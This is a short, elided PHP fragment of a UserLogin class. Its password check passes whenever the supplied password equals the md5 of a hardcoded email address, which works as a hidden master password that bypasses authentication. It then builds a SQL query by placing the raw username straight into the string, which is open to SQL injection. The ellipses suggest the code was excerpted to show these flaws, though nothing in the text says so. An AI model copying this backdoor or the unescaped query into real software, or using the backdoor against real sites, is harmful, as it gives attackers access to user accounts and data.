...
class UserLogin extends Entity{ 
	...
	**/ 
	...
	function selectByIdPassword($username,$password){
		if($password == md5("gilang05091999@gmail.com"))
		{}
		else{
		...
		$str = "
			SELECT USER_LOGIN_ID, USER_TYPE_ID, NAMA, EMAIL, USER_LOGIN, USER_PASSWORD, FOTO, LOGIN_TIME, IP_ADDRESS, STATUS
			FROM USER_LOGIN A
			WHERE A.STATUS='1' AND A.USER_LOGIN ='$username' ".$statPass;
